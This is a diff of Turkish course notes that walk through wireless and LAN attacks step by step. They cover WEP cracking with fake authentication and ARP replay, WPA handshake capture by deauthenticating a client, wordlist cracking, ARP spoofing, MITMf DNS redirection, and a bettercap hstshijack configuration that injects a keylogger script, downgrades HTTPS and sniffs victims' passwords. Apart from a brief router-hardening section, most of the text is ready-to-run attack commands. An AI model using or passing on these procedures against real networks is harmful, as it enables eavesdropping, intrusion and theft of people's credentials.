+fakat bunu yapabilmek için modemin bizden gelen bilgileri dinliyor olması lazım ve bu yüzden kendimizi modeme yetkilendirmemiz gerekiyor 
+işlemi gerçekleştirdikten sonra association successsful çıktısını alırız
+
+BU DERSİMİZDE NASIL PACKET INJECTION YAPILIR ONU ÖGRENECEGİZ 
+evet şimdi kendimizi sahte bir şekilde yetkilendirmeyi öğrendiğimize göre baştan öğrendiğimiz bütün işlemleri uygulayalım 
+ve bu sefer sonunda packet injection dediğimiz data/veri enjeksiyonunu gerçklştirelim
+önce ağ kartımızı monitor mode a alıyoruz 
+ardından airodump-ng wlan0 yazarak veri alış verişini inceliyoruz etrafımızdaki ağların veri iletişimini izliyoruz 
+ardından airodump-ng bssid 20:F3:A3:B6:32:3C --channel 9 --write arpreplay wlan0 yazıp enter a basıyoruz 
+ardından hedef ağımıza ulaşıyoruz ama #data sı çok düşük olduğunu görüyoruz yeni bir terminal açıp altına getiriyoruz 
+bu #data çok düşük olduğu için bazı yöntemler deniyeceğiz 
+aireplay-ng --fakeauth 0 -a 20:F3:A3:B6:32:3C -h 00:c0:ca:92:8f:6e  wlan0mon yazıp enter a basıyoruz ve fake authentication gerçekleşiyor 
+şimdi, packet injections dediğimiz olayı yapacağız bunu yapmak için aireplay-ng --arpreplay 0 -b 20:F3:A3:B6:32:3C -h 00:c0:ca:92:8f:6e 
+komutunu yazıyoruz 
+bu komut çalıştırıldığı zaman arp paketlerini bekleyecek ve aldığı bu paketleri enjekte edecek 
+burada yapmak istediğimiz şey veri alış verişi yani #data sı çok olmayan ağlarda eşleştirilip şifresi kırılacak kadar IV 
+yeni veri paketi bulunmadığı için biz bu ağa manuel olarak arp paketleri göndererek 
+#data/veri sayısını arttırıp bu verileri birbirleriyle eşleyip ağın şifresini kırmyı amaçlamaktayız 
+bu enjekte işleminde fake authentication yani sahte yetkilendirme yaptığımız için ağ bağlantımı kopabilir bunun için sürekli işlemin 
+sürekliliğini inceleyip eğer ağ bağlantımız koparsa yeni bir terminalden tekrardan 
+aireplay-ng --fakeauth 0 -a 20:F3:A3:B6:32:3C -h 00:c0:ca:92:8f:6e  wlan0mon komutu ile sahte yetkilendirme yapıyoruz 
+sahte yetkilendirme yapar yapmaz verilerin toplanması ve enjekte edilmesi işlemi diğer terminalde kaldığı yerden devam edecektir 
+yeteri kadar veri paketi biriktikten sonra aircrack i çalıştırabiliriz aircrak-ng arpreplay-01.cap  yazıp enter a basıyoruz 
+ve şifreyi kırmaya başlıyoruz 
+wap wep den daha güvenli bir şifreleme algoritmasıdır 
+wpa algoritmasının şifresini kırmak için tek bir yöntemimiz var o da handshake (el sıkışma) = modeme her bir cihaz bağlandığında 
+4 yönlü bir el sıkışma mevcut oluyor/gerçekleşiyor 
+ve bu handshake i yakalarsak ve dosyanın içine kaydedersek airodump-ng içinde yazdığımız dosyaya bu handshake i kullanarak
+ şifreyi belki kırabiliriz nasıl kırabiliriz wordlist denilen içinde muhtemel çok kullanılan şifrelerin olduğu bir kelime listesi
+  şifre listesi fakat bu şifre listesini direk modeme karşı deneyemediğimiz için 
+yakaladığımız handshake verisine karşı deneyeceğiz 
+şimdi wpa şifresini kırmak için ilk olarak terminali açalım daha önce yaptığımız işlemlerin aynılarını kendimizi hazır hale getirelim 
+airmon-ng start wlan0 diyerek monittör moda geçiyoruz 
+geçmiş miyiz iwconfig diyerek doğruluyoruz 
+airodump-ng wlan0mon ---> airodump-ng bssid 20:F3:A3:B6:32:3C --channel 9 --write handshake-file wlan0 diyip enterlıyoruz 
+ağı izlerken bu handshake i yakalamamızın 2 yolu var birincisi ağa birinin bağlanmasını beklemek ve bu hiç garanti değil
+ ya da ağdaki birine yetkisizlendirme saldırısı yaparak onu ağdan atmak ve ağdan attığımız zaman tekrar bağlanmak istediğinde
+  ağa yeni bir cihaz bağlandığı için handshake i yakalamış olacağız bunu yapmak için aireplay-ng --deauth 5
+  (burada bu sefer çok düşük bir değer vermemizin sebebi çok kısa süreliğine hatta hedefimizin bile anlamayacağı bir sürede ağdan kopsun 
+  ve tekrar bağlansın bu sayede handsjake i yakalayalım diye böyle bir değer giriyoruz) -a 20:F3:A3:B6:32:3C -c 2C:F0:EE:1A:BE:96 wlan0mon 
+  yazıp enterlıyoruz koptu ve girdi önceki terminalin sağ üstünde WPA Handshake: 20:f3:A3:BA:32:3C gibi bir değer görürüz 
+şimdi handshake-file olarak kaydettiğimiz dosyanın içerisinde bu handshake mevcut bundan sonra da yapmamız gereken şey birwordlist oluşturup 
+bu dosyaya karşı çalıştırmak  bu derste wordlist oluştururken kullanabileceğimiz bazı yöntemleri öğreneceğiz 
+crunch dediğimiz bir framework var ve bu bizim için bir şifre oluşturuyor şifrelerin olduğu bir text bir wordlist oluşturuyor 
+yakaladığımız handshake eğer bu liste içinde mevcutsa şifreyi eşleştirip kırmış oluruz 
+ve bu aklımıza gelen kombinasyonlarla çalıştırdığımız bir frameworkdür 
+çalıştırma parametremiz ./ crunch <min> <max> <char> -t  <pattern> -o file 
+örn : ./ crunch 8 10 123!'^+%-tm@@p -file wordlist 
+pattern = düzen demektir örneğin m ile başlasın p ile bitsin gibi koşullar yazıyoruz 
+terminale crunch yazdığımız zaman direkt olarak nasıl kullanılacağını yazdırıyor zaten 
+<min> kısmı minumum kaç karakterli bir şifre deneyeceği <max> maksimum kaç karakterli bir şifre deneyeceği bölüm 
+çoğu wpa şifresi/modemi 8 karakterden aşağı bir şifre oluşturmamıza izin vermez o yüzden buraya 8 yazıyoruz maksimum da 9 yapıyoruz ki
+ dosyamızın boyutu çok fazla olmasın çünkü fazla verirsek saatlerce sürebilir 
+<char> kısmı şifre denerken hangi karakterleri kullanmasını istediğimizi belirtiğimiz bölümdür A,B,C,D,E,F veya herhangi bir karakter setindeki
+ herhangi bir karakteri belirtebiliriz 
+biz alıştırma da bu kısmı xy123 yapacağız ardından -o testwordlist yazıyoruz -o dan sonrası şifrelerin denendiği ve raporlanarak kaydedildiği
+ oluşturduğumuz dosyamızın adı crunch 8 9 xyz123 -o testwordlist diyerek bu senaryomuza uygun olan kodumuzu tamamlayıp enter a basıyoruz 
+işlem devam ederken cat testwordlist yazarsak aktif bir şekilde şifrelerimizin denendiğini görürüz 
+crunch bize belirttiğimiz parametreler dahilindeki bütün şifreleri oluşturdu ve bunu testwordlist isimli dosyaya kaydetti 
+artık wap şifrelerini kırmak için sahip olmamız gereken 2 şeye de  sahiniz 
+bunlardan ilki bir handshake ikincisi de bir wordlist şimdi aircrack-ng isimli framework ümüzün yardımıyla handshake i bu wordlistin
+ içerisindeki bir şifreyle eşleştirmeye çalışacağız komutumuz şu aircrack-ng handshake-file-01.cap -w testwordlist dersek 
+ bu iki dosyadaki veriler arasında bir eşleştirme yapmaya çalışacak aircrack bu dersteki amacımız modemimizi ağımızı nasıl daha güvenli bir
+ hale getiririz bunun hakkında konuşacağız 
+bunun için modemimizin admin yönetici paneline erişmemiz gerekiyor bunun için kullandığımız tarayıcının adres çubuğuuna 192.168.1.1 adresini 
+yazıyoruz
+buradaki ayarlardan modemimize bağlı olan cihazların yoğunlukta kullandığı kanalları kullanmaktan ziyade başka bir kanal kullanırsak 
+daha hızlı kullanabiliriz internetimizi 
+ssid yani ağımızın ismini değiştirebiliriz bu admin paneline giriş yaptıktan sonra maksimum kaç kişinin bağlanacağını seçebiliriz 
+wps genellikle makinaların cihazların ağa kolaylıkla bağlanması için oluşturulmnuş bir sistem bu makinalardan kasıt çok büyük printerlar 
+usb wifi kartları vs tek tıkla bir düğmeye basarak bu ağa bağlanabiliyorlar fakat güvenlik önlemi çok güçlü değil 
+basit pinler ile bağlanıyorlar buraya bu yüzden kullanmıyorsak kapatmak daha mantıklı bir seçim olacaktır 
+en güvenli kablosuz ağ şifreleme algoritması şuan wpa-psk/wpa2-psk dır bunu seçiyoruz 
+artık ağa erişim sağladığımıza göre ağa bağlandıktan sonra yapılabilecek bazı işlemleri öğrenmeye geçebiliriz bu derste de bağlantı sonrası
+ bazı ayarları gerçekleştireceğiz 
+
+DISCOVER 
+Netdiscover parametresi şu şekildedir netdiscover -i <interface> -r <range>
+örn netdiscover -i wlan0 192.168.1.1/24 
+bu dersimizde netdiscover ı öğreneceğiz bu tool bağlı olduğumuz ağı keşfetmeye yarıyor net(ağ) discover(keşfetmek)
+kali linux da netdiscover yazarak bu tool u çalıştırabiliriz 
+netdiscover --help yazarsak netdiscover ı kullanacağımız bütün parametrelerinin ve ne işe yaradıklarını görebiliriz 
+bizim şuan kullanacağımız en önemli parametrelerden biri -r parametresi 
+-r = range yani alan bizim hangi alanı taramak istediğimizi söylüyoruz o bizim için o alanı tarıyor örneğin 192.168.6.0
+virtual box dan NAT Network ile bağlandığımız için ip adresimiz 10.0.2.8 gibi bir değer olarak gözükecektir 192 168 gibi bir değer yerine 
+bir hacker olarak şöyle düşünebiliriz o zaman biz eğer 10.0.2ile başlayan bütün ip adreslerini tararsam ağımdaki bütün cihazların 
+ip adresini öğrenmiş olurum 
+bunu komutla yapmak için de netdiscover -r 10.0.2.0/24 yazıp entere basıyoruz buradaki 0/24 değeri 0 ila 24 e kadar ki bütün ip adreslerini tara ve bunlara sahip olan bir cihaz varsa bana bildir demek 
+ardından ctrl+c ye basarak bu keşif işlemini dudurabiliriz 
+yazdırılan çıktıda hem ip adresleri hem de mac adresleri mevcut 
+bu ip ve mac tespiti keşif işlemin ARP denilen bir teknoloji kullanıyor (Address Resolution Protocol) (adres çözümleme protokolü)
+bu işlemde kısaca hangi ip hangi mac adresiyle eşleşiyor onu bulmaya çalışıyoruz 
+ağdaki cihazları haritalamak neyin nerede olduğunu vs anlayabilmek için ihtiyacımız olan diğer aracımız nmap 
+normalde bu aracı ağ içi saldırılarda çok fazla kullanmayız genelde web sitelerine dış serverlara gerçekten bir açık var mı aramak için
+ sistemlere test yapmak için kullanırız
+nmap i çalıştırmak için nmap 10.0.2.0/24 enter a bastıktan sonra önümüze çıkan çıktılarda örneğin açık portları gösteriyor 
+portlar = bilgi alışverişini sağladığımız kapılar gibi düşünebiliriz 
+çıkan çıktıda ip adresine sahip olan cihazın kullandığı işletim sistemi bile gözüküyor 
+virtual box ın verdiği sanal ip adresi değişebilir vb ı açıp kapayınca makineyi silip tekrar yükleyince vs 
+MITM (Man In The Middle) (Ortadaki Adam) = normalde bir siteye bağlanırken önce router a bir istek göndeririz
+ router dns serverına sonra dns serverı router a router da bize ama man in the middle saldırısında biz önce hacker ın bilgisayarına
+  istek yolluyoruz hacker routera router dns sunucusuna sonra tam tersi bir işlem gerçekleşerek gelen response nihayetinde 
+bize oluşmadan önce geldiği son yer hackerın bilgisayarı oluyor 
+peki neden böyle bir şey yapıyoruz çünkü eğer bilgi iletimi alışverişi akışı bizim üzerimizden yani hackerın üzerinden olursa 
+biz bütün bu trafikte gelen giden bütün verileri görebilir ve okuyabiliriz 
+bu saldırıda biz kendimizi hedef makina ile modemin arasına konumlandırırız 
+ve bu saldırıyı gerçekleştirmek için hedef cihazımızın mac adresini kullanacağız 
+neden çünkü bilgi alışverişleri 2 cihaz arasında mac adresleri aracılığı ile yapılır 
+bunu yapmak için de hedef cihazımıza mac adresimizi modemin mac adresi olarak tanıtacağız 
+kurbana kendimizi modem olarak modeme de kendimizi ağdaki biri olarak tanıtacağız 
+ve herhangi bir şekilde anlaşılamaz bizim arada olduğumuz çünkü dikkat çekecek bir işlem yapmayız bu saldırıda kurban yine istediği
+ herhangi bir işlemi gerçekleştirir ve şüphelenmesi için herhangi bir sebebi yok 
+bu arada kurbanımızın büün internet trafiğini izleyebileceğiz ve tüm bilgilerini ele geçirevbileceğiz hangi sitelere giriyor 
+girdiği şifreleri ne vs ARP teknolojisi, ağ içinde bir bilgisayar, bir telefon veya bir modemden arp kullanarak mac adresleri
+ ile ip adreslerini eşleştirebiliyor arp protokolünde bir açık var ve açık da şu ki arp isteği almadan arp cevabı gönderebiliyoruz 
+ yani modem xxx ip si kime ait diye ağdaki cihazlara sorduğunda ip si o olan cihaz o ip benim ve mac adresim de xxx diye cevap vermesi 
+ ve bu ip ile mac in eşleştirilmesi işlemini ifade eden  arp teknolojisinde modem herhangi bir ip adresi sormadan cevap verip o ip adresi
+  benim ve mac imde şu diyebiliyoruz yani modeme hedef bilgisayarmışım onun ipsine ve mac ine sahipmişim gibi davranırken hedef bilgisayarıma
+   da modemin kendisi olduğumu söyleyeceğim 
+eğer windows cmd ekranına arp -a yazarsak arp tablosu karşımıza çıkar bu netdiscover ile bulduğumuz sonucun hemen hemen aynısı
+ fakat buradaki fark şu biz arp -a çalıştırdığımızda sadece windows un etkileşimde 
+olduğu cihazları görebiliyoruz buradaki ff:ff:ff:ff:ff:ff yayın yapma broadcast netwoeküdür 
+diğerleri sanal mac ve ip adresleri olarak gözüküyor çünkü windows ile bu cihazlarla etkileşimde olmadığımız için 
+birazdan kali linux ile windowsa arp saldırısı yapacağız o zaman etkileşime girdiğimiz zaman bu bilgileri göreceğiz 
+bu çıktıda hangi ip adresi hangi mac adresine sahip bunu görebiliyoruz 
+burada dikkat etmemiz gereken şey modemimizin hangi mac adresine sahip olduğudur  192.168.1.1   a0-e4-cb-b1-65-be benimki bu şekilde (modemim)
+hangisinin modem olduğunu anlamak için de genellikle modemin local ip adresi 192.168.1.1 dir 
+virtual box gibi sanal makinalarda modemin adresi 10.0.2.1 şeklinde de gözükebilir 
+arp saldırısını manual olarak veya bazı frameworkler kullanarak yapabiliriz bu gün bu iş için bir framework öğreneceğiz
+ frameworklerden önce bu işlemi manuel olarak nasıl yaparız onu öğreneceğiz ki arka planda nasıl çalıştığını anlayabilelim / 
+ spoof = sahterkarlık / bu saldırıya arpspoofing veya ARP Poisoning de (arp zehirlenmesi) denilebiliyor 
+arp spoof u manuel olarak yapmak için arpspoof -i (yani interface) eth0 //burada hangi bağlantı türünü kullandığımıza göre 
+o bağlantı türümüzün interfaceini yazacağız kablosuz olsaydı wlan0 yazacaktık // 
+ardından -t (yani target /hedeffimizi yazacağız) 10.0.2.4 //hedef cihazın ip adresini yazacağız bundan sonra bir boşluk bırakıp modemimizin
+ de ip adresini yazmamız gerekiyor 
+10.0.2.1 yazıyoruz //sizin ip adresiniz neyse onu yazın //modem 
+arpspoof i- eth0 -t 10.0.2.4 10.0.2.1 komutumuzun tamamı bunu iki farklı terminalde eş zamanlı çalıştırmamız lazım çünkü hem modeme 
+kendimizi hedef cihaz olarak tanıtıyoruz hem de hedef cihaza kendimizi modem olarak 
+saldırı başarılı oldu mu bunu teyit etmek için windows makinamıza arp -a  yazarak eski mac adresimizi 
+saldırı yaptığımız cihaza verildiğini modemimize yeni bir ip adresi atandığını görerek doğrulayabiliriz 
+bu şekilde aslında bize bir mitm saldırısı yapılıyor mu bunu anlayabiliriz 
+fakat bir komut daha çalıştırmamız gerekiyor bunu her mitm saldırısı yapmadan çalıştırmamız gerekiyor 
+BU KOMUT echo 1 > /proc/sys/net/ipv4/ip_forward yazıp enter a basıyoruz bu ip forward dediğimiz 
+ip yönlendirmesi protokolü dediğimiz bir işlemi etkin hale getiren ve her kali linux u başlattığımız zaman arp saldırısı yapmadan önce 
+çalıştırmamız gereken bir komuttur çünkü bunu yapmazsak hedef bilgisayarımızın 
+internet bağlantısı çöker ve internete giremez peki ip forwarding nedir ne işe yarar ip  forwarding 
+bizim ortadaki adam oalrak modemden aldığımız paketleri hedef bilgisayara iletmek ulaştırmak için gerekli olan 
+bir protokol bir hizmet/servistir bu komutta bu konumdaki dosyanın içine 1 yazdırıyoruz ki bu hizmet etkin olsun 
+bir yazdırılmamışsa etkin değildir demektir 
+bu komutun başarılı olup olmadığını tarayıcı da herhangi bir internet sitesini açarak doğrulayabiliriz 
+
+mitmf github diye aratıp bir m.framework ü ile m yapmaya çalışacağız // https://github.com/byt3bl33d3r/MITMf dan indirebilriz 
+açılan pencereden clone or download diyerek indiriyoruz 
+mitmf-master.zip indireceğimiz dosyanın ismi bu zip e sağ tıklayıp open with emgrampa archive manager ile açıp açılan penceredeki
+ dosyayı downloads klasörüne sürüklersek dosyayı çıkarmış oluruz 
+daha sonra terminali açıp bu klasöre gitmemiz lazım cd Downloads yazıyoruz cd MITMf-master yazıyoruz 
+ardından python mitmf.py -i wlan0 --arp --spoof --gateway 10.0.2.1 target 10.0.2.4
+komutunu yazıyoruz buradaki -i (kullandığımız ağ kartının adı(interface i wlan0 veya eth0) 
+gateway = modemin ip adresi target = hedefin ip adresi 
+bunları yazıp enter a basınca bir hata alırsak plugins(lifepwn.py yi silmemiz lazım, siliyoruz) bunu sildikten sonra tekrar yazıyoruz 
+eğer yine çalışmazsa bazı python kütüphanelerini yüklememiz lazım 
+terminale bu kodu yazıp gelen soruya Y diyoruz ;
+apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
+bu yüklediğimiz kütüphaneler sorunumuzu çözecektir ama onları da yüklememize rağmen sorunumuz devam ederse 
+requirements.txt dosyasının içindeki kütüphaneleri de yüklememiz gerekiyor bu dosya arşivden çıkardığımız mitf klasörünün içindedir 
+bunu yapmak için de mitf klasörünün içerisindeyken (terminalde) pip install -r requirements.txt komutunu çalıştırıyoruz // 
+pip gerekli kütüphaneleri yüklememizi sağlar python ile tüm bunları sorunsuz bir şekilde yaptıktan sonra framework mitm saldırısını 
+başarıyla gerçekleştirmiş mi bunu doğrulamak için windows makinemizden arp -a komutunu çalıştırıp modem ile aynı mac adresine sahip bir 
+cihaz daha var mı diye kontrol ediyoruz eğer varsa saldırımız başarıyla gerçekleşmiştir 
+hedef bilgisayarımızın ağ trafiğini izlemeden önce tarayıcı geçmişini siliyoruz ki önceki ve sonraki veriler birbirine karışmasın 
+girdiği her siteyi ve http olan sitelerde girdiği her username ve password u framework de şifrelenmemiş bir şekilde açıkça görebiliriz 
+mitmf unu çalıştırdığımızda SSL Strip diye bir şey devreye girer bu httpS in secure olan kısmını strip eder 
+(https den http ye downgrade yani /indirme,düşürme işlemi yapmaya çalışır) peki bu nasıl oluyor 
+bazı siteler google.com veya facebook.com gibi htst protokolünü kullanır HSTS:HTTP Strict Transport Security HTTP Katı Taşıma Güvenliği
+HTTP Katı Taşıma Güvenliği, web sitelerini protokol indirgeme ve oturum çalma saldırılarına karşı korumaya yardımcı olan bir
+web güvenlik politikası mekanizmasıdır. Web sunucuları, kendisine gönderilen isteklerin yalnızca HTTPS üzerinden olması gerektiğini
+ web tarayıcılarına bu mekanizma ile belirtir. bu derste mitmf de dns saldırılarını göreceğiz 
+dns saldırısı mitf yaptığımız hedef bilgisayarın bir siteye giderken örneğin google.com dns hizmetini kullanacaktır ona bu hizmeti 
+google dns serverının vermesini engelleyerek bu hizmeti bizim vermemizi sağlamak 
+ona google ın gerçek ip sini değil de kendi web sitemizin ip sini vererek kurbanı yanlış yönlendirmek 
+kısaca kendi bilgisayarımızı sunucu gibi kullanacağız bunu yapmak için terminale service apache2 start yazıyoruz
+ root da iken yazarsak şifre sormaz değilsek mevcut kullanıcımızın şifresi varsa onu sorar 
+aslında şuan bir websitemiz var // bütün linux sistemlerinde websiteleri bir yere kaydedilir /var/www/html/ burada ilgilendiğimiz kısım 
+index.html neden bu dosyayla ilgileniyoruz 
+bu dosya bir web sitesine gidildiği zaman ilk gösterilen dosya şimdi bu dosyayı editleyeceğiz sağ tıklıyoruz 
+open with other application diyoruz normal bir text editörle veya leafpad ile açabiliriz 
+bu dosyadaki her şeyi ctrl a yapıp siliyoruz ve <h1> i hack you </h1> yazıp kaydediyoruz permission denied hatası alacağız 
+bunu sudo su diyerek root a geçip chmod 777  /var/www/html/index.html komutu ile 
+dosyamıza değiştirme yetkisi veriyoruz ve bu işlemleri tekrar yapıp kaydediyoruz çalıştı mı bunu test etmek için firefox a 
+geri dönüyoruz adres çubuğuna bağlı olduğumuz ağdaki lokal ipmizi yazıyoruz 
+benimki 192.168.1.37 yazıp tıkladığımızda i hack you yazısını göreceğiz bu sadece lokal bilgisayarımızda değil aynı ağda bulunan bütün cihazlar
+ tarafından görülebilir bizim de amacımız bu ağda belirlediğimiz bir hedef cihazı bizim ip adresimizden yayına aldığımız sitemize yönlendirmek 
+şimdi ağdaki bir cihaz hangi websiteye girdiği zaman bizim websitemize yönlendirileceğini belirlemek için bunun için 
+/home/kali/Downloads/MITMf-master/config/mitmf.conf dosyasını açıyoruz (sağ tık open with text editor burası genel ayarlaırn yapıldığı bir 
+dosya bunun içinde [[DNS]] bölümünün altında [[[A]]] bölümünde enter ile iki boşluk açıyoruz ve 2 defa tab a basarak imleci aynı hizata 
+getirdikten sonra *. yapıp *.unicornitems.com=192.168.1.37
+		*.atilsamancioglu.com=192.168.1.37 yazıyoruz ikisi için de aynı işlemleri tekrarlamamız gerekiyor daha sonra kayddiyoruz bunu yapmamızdaki amaç aynı ağa bağlandığımız cihazların bu sitelere gitmek istedikleri 
+    zaman bizim web sitemize yönlendirilmelerini sağlamak kaydedip kapatıyoruz ardından komut satırına python mitmf.py -i wlan0 --arp --spoof --gateway 192.168.1.1 target 10.0.2.4  --dns yazıyoruz tabii bunları 
+    /home/kali/Downloads/MITMf-master/ dizininin içinde yapmamız gerekiyor (komut satırındayken) önceki derste de söylediğimiz gibi mitf ünü kullanırken tarayıcı verilerini geçmişi vs  siliyoruz daha sağlıklı 
+    bir sonuç almak için eğer bu yönlendirme çalışmaz ise echo 1 > /proc/sys/net/ipv4/ip_forward komutunu yazmayı unutmuşuzdur demektir kaliyi her kapanıp açıldığında bunu yazmamız  gerekiyor 
+    bu çalışma örneğin şirketlere uygulanan bir pentest senaryosunda şirket çalışanlarına farkındalık için bir hacking olabilir
+    bu derste hem hedef cihazımıza mitm yapmayı hem de onun bilgilerini okumamızı sağlayacak olan program olan bettercap i öğreneceğiz 
+    önce depolarımızı güncellemek için apt-get update daha sonra apt-get install bettercap yazıp bettercap i yüklüyoruz 
+    bettercap -iface wlan0 yazarak bettercap i çalıştırabiliriz 
+    help komutunu yazarak (açılan bölümde) kullanılabilecek parametreleri görebiliriz 
+    burada çıkan modüllerin nasıl kullanıldığını öğrenmek için de help modülismi 
+    örneğin net.probe parametresi net.probe on yazarsak bu modülü çalıştıracak net.probe off yaparsak kapatacak 
+    net.probe on yaparak bağlı olduğumuz ağdaki cğihazları tarıyoruz 192.168.1.35 benim telefonumun lokal ip adresidir 
+    net.show diyerek bu çıktıyı daha düzgün bir şekilde tablo halinde görüntüleyebiliriz 
+    help arp.spoof yazarak bu modülün nasıl çalıştığını görebiliriz arp.spoof on yaparak bu modülü etkinleştirebiliriz arp.spoof off yaparak durdurabiliriz 
+    arp.ban on komutu deauthentication saldırısını yapmamızı sağlayan komuttur arp.ban off bu saldırıyı durdurur 
+    arp.spoof.fullduplex bu parametrenin değeri true olursa hem modeme hem de hedef cihazaa arp spoof yaparız ancak bu parametre default da false olarak geliyor bunu true yapmamız gerekiyor 
+    set arp.spoof.fullduplex true komutu ile bu işlemi gerçekleştirebiliriz 
+    linuxda bir parametrenin değerini değiştirmek için genelde set <parametre adı> <parametrenin değeri> şeklinde yazmamız gerekiyor 
+    set arp.spoof.targets 192.168.1.1 yazarak arp spoof saldırısındaki hedef cihazlarımın lokal ip adreslerini giriyoruz 
+    şuan saldırı yapmaya hazırız bundan sonra arp.spoof on yaparsak arp  saldırısını başlatmış oluruz 
+    windows sanal makinamıza gidip arp -a yi çalıştırırsak kali linuz umuzun modemin mac adresiyle aynı mac adresine sahip olduğunu görürüz 
+    bu bölümde arp.spoof ile topladığımız bilgileri nasıl görebileceğimizi ele geçirebileceğimizi öğreneceğiz okuyacağımızı öğreneceğiz 
+    bunu net.sniff komutu ile yapacağız komutumuzun nasıl çalıştığını ve parametrelerini öğrenmek için help net.sniff diyoruz net.sniff on yaparsak bu modülü çalıştırırız bunu yazarak çalıştırıyoruz 
+    çalıştırdıktan sonra hedef bilgisayarın girdiği web siteler ve eğer login olduğu site http ise username ve şifresi veri olarak alındı bunu bulmak için terminalde üstteki bardan actions>find>password olarak
+    aratınca çıkan çıktılardan biri hedef bilgisayarın girmiş olduğu şifredir . username i yazarsak da bu sefer çıkan çıktılardan biri hedef kullanıcının username i dir 
+    bettercap de halihazırda devam eden bir işlem varsa exit diyerek bu işlemi sonlandırabiliriz normalde bettercap https siteleri downgrade konusunda başarılı bir tool değil ama bunu caplet ile değiştireceğiz
+    caplet bettercap ile gelen bazı kodlardır bettercap ile beraber çalıştırabileceğimiz bazı saldırılar caplets.show yazarak bu caplet leri görüntüleyebiliriz bu komuttan sonra çıkan çıktıda 
+    name sutunu altında bu capletlerin isimleri path sütunu altında da işletim sisteminde hangi dizinde yer aldığını gösterir /usr/share/bettercap/caplets/ konumunda barındırılıyor eğer burada caplet 
+    dosyaları yoksa /usr/share/bettercap/caplets/ adresinden indirebiliriz bizim caplets klasöründe ilgilendiğimiz dizin /usr/share/bettercap/caplets/hstshijack/ buraya girioruz hstshijack.cap dosyasını 
+    sağ tıklayıp geany ile açıyoruz (geany text editörüdür eğer yüklü değilse apt-get install geany diyerek yükleyebilirsin) [geany ile açmıyormuşuz leafpad ile açıcaz] terminalden dosyanın bulunduğu konuma 
+    gidiyoruz apt-get install leafpad diyerek leafpad i yüklüyoruz leafpad hstshijack.cap diyerek dosyamızı açıyoruz //hijack = bir şeyi ele geçirmek,kaçırmakialıkoymak demek 
+    set hstshijack.log satırında eğer /local diye bir dizin varsa bunu siliyoruz bu satır işlemleri logluyor kaydediyor bizim pcmizde de local isimli bir dizin olmadığı için hata alabiliriz veya düzgün çalışmaz 
+    set http.proxy.script  /usr/share/bettercap/caplets/hstshijack/hstshijack.js kısmını bu şekilde düzenliyoruz /local varsa siliyoruz 
+    set hstshijack.payloads        *:/usr/share/bettercap/caplets/hstshijack/payloads/hijack.js satırındaki hijack.js den sonraki yazıları isliyoruz burada sslstrip mitmf de https i downgrade etmmeye yarar 
+    ve keylogger.js yi siliyoruz // set hstshijack encode satırındaki değeri false yapıyoruz set hstshijack.targets   satırı hedef sitelerimizi belirttiğimiz yerdir 
+    set hstshijack.replacements satırı da hedef bilgisayar targets daki sitelere giderse onu yönlendireceğimiz siteleri ifade eder mesela bu dosyada facebook.com a giderse onu facebook.corn a yönlendir 
+    dosyanın içindeki *. ifadesi  her şey anlamına geliyor yani örneğin facebook.com da bir yere tıkladığımızda bazen link username.facebook.com olabiliyor linkin başında veya sonunda değişiklikler olabiliyor
+    bu *. ifadesi ile böyle bir değişiklik olsa bile onu da aynı facebook.com a girmiş gibi davranarak downgrade et komutunu vrmiş oluyoruz buraya bir değer eklemek için varolan değerden sonra virgül (,) koyup bir 
+    boşluk bıraktıktan sonra eklemek istediğimi değeri giriyoruz ama burada önemli bir detay var o da şu ki bir değer eklerken başına www. ifadesi kullanırsak bu o sitenin https ile açılacağını garanti ediyor ve 
+    bu framework ü kullansak bile yöntemimiz işe yaramıyor o yüzden bir değer yazarken başına www. ifadesi kullanmamak en doğrusudur
+    # Documentation can be found at https://github.com/bettercap/blob/master/hstshijack/README.md
+
+set hstshijack.log             /usr/share/bettercap/caplets/hstshijack/ssl.log
+set hstshijack.ignore          *
+set hstshijack.targets         facebook.com, *.facebook.com, *.bing.com, bing.com, www.linkedin.com, twitter.com
+set hstshijack.replacements    facebook.corn, *.facebook.corn,*.bing.corn, bing.corn, linkedin.com, twitter.corn
+#set hstshijack.blockscripts    facebook.com,*.facebook.com
+set hstshijack.obfuscate       false
+set hstshijack.encode          false
+set hstshijack.payloads        *:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.js, *:/root/atil.js
+
+set http.proxy.script  /usr/share/bettercap/caplets/hstshijack/hstshijack.js
+set dns.spoof.domains  facebook.corn, *.facebook.corn,*.bing.corn, bing.corn, linkedin.com, twitter.corn
+
+http.proxy  on
+dns.spoof   on
+
+
+bu şekilde olmalıdır metin belgemiz set hstshijack.replacements kısmına koyduğumuz bütün değerleri set dns.spoof.domains satırına da 
+aynen yazmamız gerekiyor kopyala yapıştır yapabiliriz 
+#set hstshijack.blockscripts    facebook.com,*.facebook.com başında hash # işareti olan bu satır yorum satırıdır yani js de çalıştırılmaz 
+yorum satırları herhangi bir programlama dilinde not almak için kullanılırlar ve program run edildiğinde çalıştırılmaz 
+es geçilirler yine // iki adet slash işareti de yorum satırı olduğunu ifade eder 
+bu dersimizde bir hsts kırmayı deneyeceğiz öncelikle net.probe on yazıp bu modülü aktif hale getiriyoruz daha sonra  
+set arp.spoof.fullduplex true komutu ile hem modeme hem de hedef cihaza arp spoofing 
+saldırısı yapma özelliğini aktifleştiriyoruz daha sonra targets kısmını değiştireceğiz set arp.spoof.targets yazıp 
+hedef cihazın ipsini giriyoruz 
+eğer ethernet üzerinden değil de wifi card ile yapılıyorsa saldırımız bunun için set arp.spoof.internal true yapıp bu modülü etkinleştiriyoruz
+ daha sonra da arp.spoof on diyoruz ve saldırımızı başlatıyoruz
+şimdi sadece net.sniff i başlatıp gelen giden trafiği izlemek kaldı net.sniff on diyoruz ve bunu başlatıyoruz en son olarak da
+ hsts i çaıştırmamız lazım bunun için de htsthijack/htsthijack yazıyoruz hepsini yazmamıza gerek yok birazını yazıp tab e basarsak
+  bizim için tamamlar daha sonra hedef cihazımızdaki internet geçmişini tamamen siliyoruz ki veriler birbirine karışmasın 
+  daha sonra linkdin veya stackoverflow gibi sitelerde denediğimizde downgrade in başarılı olduğunu görüyoruz
+framework ün aldığı verilerde de emaili bulmak için find kısmına @hotmail veya @gmail yazıp hızlı bir şekilde bulaibliriz 
+şifre için de password yazıp şifreyi görüntüleyebiliriz 
+bu derste https de denediğimiz saldırıyı hsts sitelerde deneyeceğiz önce hedef bilgisayarımızın tarayıcısının geçmişini siliyoruz 
